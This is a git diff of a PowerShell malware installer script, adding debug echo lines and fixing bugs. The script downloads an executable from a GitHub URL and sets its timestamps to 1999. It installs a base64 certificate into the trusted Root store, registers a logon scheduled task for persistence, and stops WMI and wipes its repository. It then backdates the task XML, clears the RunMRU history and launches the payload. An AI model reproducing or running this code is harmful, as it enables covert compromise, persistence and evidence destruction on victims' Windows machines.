@@ -5,6 +5,7 @@ curl "https://raw.githubusercontent.com/mohamedali43/ps1/main/installer.exe" -o 
 (Get-Item $TargetPath).CreationTime=("1 Jan 1999 0:00:00")
 (Get-Item $TargetPath).LastWriteTime=("1 Jan 1999 0:00:00")
 (Get-Item $TargetPath).LastAccessTime=("1 Jan 1999 0:00:00")
+echo "OK"
 
 #cert
 $base64Cert = @"
@@ -21,22 +22,24 @@ $store = New-Object System.Security.Cryptography.X509Certificates.X509Store("Roo
 $store.Open("ReadWrite")
 $store.Add($cert)
 $store.Close()
+echo "OK cert"
 
 #persistance
 $TaskName = "TEST"
 $Action = New-ScheduledTaskAction -Execute $TargetPath
 $Trigger = New-ScheduledTaskTrigger -AtLogon
-$Principal = New-ScheduledTaskPrincipal $env:COMPUTERNAME + "\" + $env:USERNAME
+$Principal = New-ScheduledTaskPrincipal ($env:COMPUTERNAME + "\" + $env:USERNAME)
 Register-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -TaskName $TaskName
 
 Set-Service Winmgmt -StartupType Disabled
 Stop-Service -Force -Name Winmgmt
 
 Remove-Item -Path "C:\Windows\System32\wbem\Repository\*" -Recurse -Force
+echo "OK persistance"
 
 #alter xml
 $TaskPath = "C:\Windows\System32\tasks\" + $TaskName
-[xml]$xml = (Get-Content -Path $v -Encoding Unicode)
+[xml]$xml = (Get-Content -Path $TaskPath -Encoding Unicode)
 if($xml.Task.RegistrationInfo.Date)
 {
     $xml.Task.RegistrationInfo.Date = "1999-01-01T00:00:00.0000000"
@@ -49,6 +52,7 @@ if($xml.Task.RegistrationInfo.Date)
 
 Set-Service Winmgmt -StartupType Automatic
 Start-Service -Name winmgmt
+echo "OK alter xml"
 
 #clean 
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
@@ -62,6 +66,7 @@ foreach ($valueName in $values.PSObject.Properties.Name)
         echo $valueName
     }
 }
+echo "OK clean"
 
 #run
-Start-Process -FilePath Start-Process -FilePath "C:\Windows\System32\installer.exe"
+Start-Process -FilePath "C:\Windows\System32\installer.exe"
